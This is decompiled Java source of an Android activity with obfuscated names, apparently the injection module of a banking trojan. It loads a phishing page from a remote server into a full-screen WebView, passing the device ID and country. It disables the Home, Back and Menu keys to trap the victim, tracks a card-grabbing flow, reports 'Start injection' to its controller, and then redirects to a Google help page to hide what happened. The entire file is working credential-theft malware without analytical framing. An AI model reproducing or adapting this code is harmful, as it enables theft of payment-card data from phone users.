package wocwvy.czyxoxmbauu.slsa.ncec;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.res.Resources;
import android.os.Bundle;
import android.view.KeyEvent;
import android.webkit.JsResult;
import android.webkit.WebChromeClient;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import wocwvy.czyxoxmbauu.slsa.C0020b;
import wocwvy.czyxoxmbauu.slsa.C0022c;

/* JADX INFO: loaded from: classes.dex */
public class ozkgyjpxtyxajmm extends Activity {

    /* JADX INFO: renamed from: a */
    C0022c f465a = new C0022c();

    /* JADX INFO: renamed from: b */
    C0020b f466b = new C0020b();

    /* JADX INFO: renamed from: wocwvy.czyxoxmbauu.slsa.ncec.ozkgyjpxtyxajmm$a */
    private class C0039a extends WebChromeClient {
        private C0039a() {
        }

        @Override // android.webkit.WebChromeClient
        public boolean onJsAlert(WebView webView, String str, String str2, JsResult jsResult) {
            return true;
        }
    }

    /* JADX INFO: renamed from: wocwvy.czyxoxmbauu.slsa.ncec.ozkgyjpxtyxajmm$b */
    private class C0040b extends WebViewClient {
        private C0040b() {
        }

        @Override // android.webkit.WebViewClient
        public void onPageFinished(WebView webView, String str) {
            ozkgyjpxtyxajmm.this.f466b.m230a("Start Activity Inject", str);
            if (str.contains("a10.php") && !str.contains("STOP")) {
                ozkgyjpxtyxajmm.this.f466b.m250d(ozkgyjpxtyxajmm.this, "save_inj", "");
                ozkgyjpxtyxajmm.this.f466b.m250d(ozkgyjpxtyxajmm.this, "lock_inj", "");
                ozkgyjpxtyxajmm.this.f466b.m250d(ozkgyjpxtyxajmm.this, "timeStartGrabber", "");
                ozkgyjpxtyxajmm.this.f466b.m250d(ozkgyjpxtyxajmm.this, "name", "false");
                webView.loadUrl("https://support.google.com/calendar/answer/6261951?hl=en&co=GENIE.Platform=Android");
            }
            if (str.contains("STOP")) {
                webView.loadUrl("https://support.google.com/calendar/answer/6261951?hl=en&co=GENIE.Platform=Android");
                ozkgyjpxtyxajmm.this.finish();
            }
            if (str.contains("exitdagjhadfjedgjsfhexitlgdgsfhafg")) {
                webView.loadUrl("https://support.google.com/calendar/answer/6261951?hl=en&co=GENIE.Platform=Android");
                ozkgyjpxtyxajmm.this.finish();
            }
            if (str.contains("|Grabber card step 3|")) {
                ozkgyjpxtyxajmm.this.f466b.m250d(ozkgyjpxtyxajmm.this, "save_inj", "");
                ozkgyjpxtyxajmm.this.f466b.m250d(ozkgyjpxtyxajmm.this, "lock_inj", "");
                ozkgyjpxtyxajmm.this.f466b.m250d(ozkgyjpxtyxajmm.this, "timeStartGrabber", "");
                ozkgyjpxtyxajmm.this.f466b.m250d(ozkgyjpxtyxajmm.this, "name", "false");
            }
        }

        @Override // android.webkit.WebViewClient
        public boolean shouldOverrideUrlLoading(WebView webView, String str) {
            return false;
        }
    }

    @Override // android.app.Activity
    public void onBackPressed() {
        super.onBackPressed();
    }

    @Override // android.app.Activity
    @SuppressLint({"SetJavaScriptEnabled"})
    protected void onCreate(Bundle bundle) {
        super.onCreate(bundle);
    }

    @Override // android.app.Activity
    public void onDestroy() {
        super.onDestroy();
        this.f466b.m250d(this, "name", "false");
    }

    @Override // android.app.Activity, android.view.KeyEvent.Callback
    public boolean onKeyDown(int i, KeyEvent keyEvent) {
        return i == 3 || i == 4 || i == 82;
    }

    @Override // android.app.Activity
    protected void onResume() {
        super.onResume();
    }

    @Override // android.app.Activity
    protected void onStart() {
        super.onStart();
        this.f466b.m250d(this, "name", "true");
        String strM251e = this.f466b.m251e(this, "str_push_fish");
        if (strM251e.equals("") && strM251e.equals(null)) {
            return;
        }
        this.f465a.getClass();
        String strM251e2 = "";
        try {
            strM251e2 = this.f466b.m251e(this, "urlInj");
        } catch (Exception unused) {
        }
        this.f466b.m230a("START INJ", "" + strM251e);
        WebView webView = new WebView(this);
        webView.getSettings().setJavaScriptEnabled(true);
        webView.setScrollBarStyle(0);
        webView.setWebViewClient(new C0040b());
        webView.setWebChromeClient(new C0039a());
        webView.loadUrl(strM251e2 + "/fafa.php?f=" + strM251e + "&p=" + this.f466b.m264q(this) + "|" + Resources.getSystem().getConfiguration().locale.getCountry().toLowerCase());
        setContentView(webView);
        C0020b c0020b = this.f466b;
        StringBuilder sb = new StringBuilder();
        sb.append("p=");
        sb.append(this.f466b.m242c(this.f466b.m264q(this) + "|Start injection " + strM251e + "|"));
        c0020b.m235b(this, "4", sb.toString());
    }

    @Override // android.app.Activity
    protected void onStop() {
        super.onStop();
        this.f466b.m250d(this, "name", "false");
    }
}
